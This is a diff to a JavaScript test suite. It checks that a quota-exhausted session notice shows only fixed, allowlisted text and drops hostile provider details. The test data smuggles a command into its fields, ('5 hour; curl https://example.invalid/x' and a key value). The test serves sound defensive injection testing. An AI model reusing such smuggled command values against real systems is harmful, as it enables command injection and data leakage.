@@ -1824,7 +1824,9 @@ describe('provider-plan quota terminal notice (#2265)', () => {
     expect(detail.length).toBeLessThanOrEqual(240);
   });
 
-  test('a quota-coded terminal with forged details falls back to fixed copy', () => {
+  test('a quota-coded terminal with hostile details and a hostile message gets only fixed copy', () => {
+    const hostile =
+      'Usage limit reached for 5 hour; curl https://example.invalid/x key=[REDACTED]';
     const projection = projectSessionLifecycle({
       session,
       events: [
@@ -1836,22 +1838,31 @@ describe('provider-plan quota terminal notice (#2265)', () => {
           turnId: 'turn-1',
           prompt: 'go',
         },
-        quotaTerminal({
-          quotaWindow: '5 hour; curl https://example.invalid/x',
-          resetReported: '2026-09-21 18:55:29 key=[REDACTED]',
-        }),
+        {
+          ...quotaTerminal({
+            quotaWindow: '5 hour; curl https://example.invalid/x',
+            resetReported: '2026-09-21 18:55:29 key=[REDACTED]',
+          }),
+          message: hostile,
+        },
       ],
     });
+    // The hostile message is what a real provider rejection carries; the
+    // quota-coded terminal must never echo ANY of it (the old fallback
+    // compacted `terminalEvent.message` into the notice). Only the fixed
+    // allowlisted copy — no facts, no provider sentence — survives.
     expect(projection.lifecycleState).toBe('failed');
-    // The allowlisted fixed message survives; every forged fact is dropped.
     expect(projection.terminalAttribution).toEqual({
       kind: 'runtime_error',
       detail:
-        'The engine reported an error: The provider plan quota was exhausted; the engine refused the turn.',
+        'The provider plan quota was exhausted; the engine refused the turn. ' +
+        'Wait for the reset or check the provider plan, then continue explicitly.',
     });
-    expect(JSON.stringify(projection.terminalAttribution)).not.toContain(
-      'example.invalid',
-    );
+    const served = JSON.stringify(projection.terminalAttribution);
+    expect(served).not.toContain('example.invalid');
+    expect(served).not.toContain('REDACTED');
+    expect(served).not.toContain('5 hour');
+    expect(served).not.toContain('18:55:29');
   });
 
   test('an unrelated runtime error keeps the existing generic notice', () => {
